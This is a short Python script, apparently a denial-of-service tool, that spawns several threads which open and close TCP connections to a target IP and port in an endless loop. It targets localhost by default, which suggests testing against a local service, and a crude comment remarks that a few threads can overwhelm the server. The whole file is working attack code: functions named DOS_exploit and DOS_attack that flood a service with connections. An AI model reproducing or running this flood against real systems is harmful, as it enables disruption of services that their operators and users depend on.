#!/usr/bin/pypy
import socket
import threading

def DOS_exploit(ip,port):
    print('init success',ip,port)
    while True:
        try:
            s = socket.socket()
            s.connect((ip,port))
        except KeyboardInterrupt:
            s.close()
            exit()
        except socket.error as e:
            pass
        except Exception as e:
            print(e)
            pass
        finally:
            s.close()

def DOS_attack(ip='127.0.0.1',port=8889,threadnum=4):
    # threadnum = 10 # guess cpu?  perhaps 4 threads can also fuck the server >.<
    pool = []
    for _ in range(threadnum):
        thr = threading.Thread(target = DOS_exploit,args=(ip,port))
        pool.append(thr)
        thr.start()
    
if __name__ == '__main__':
    DOS_attack('127.0.0.1',8888,4)
    
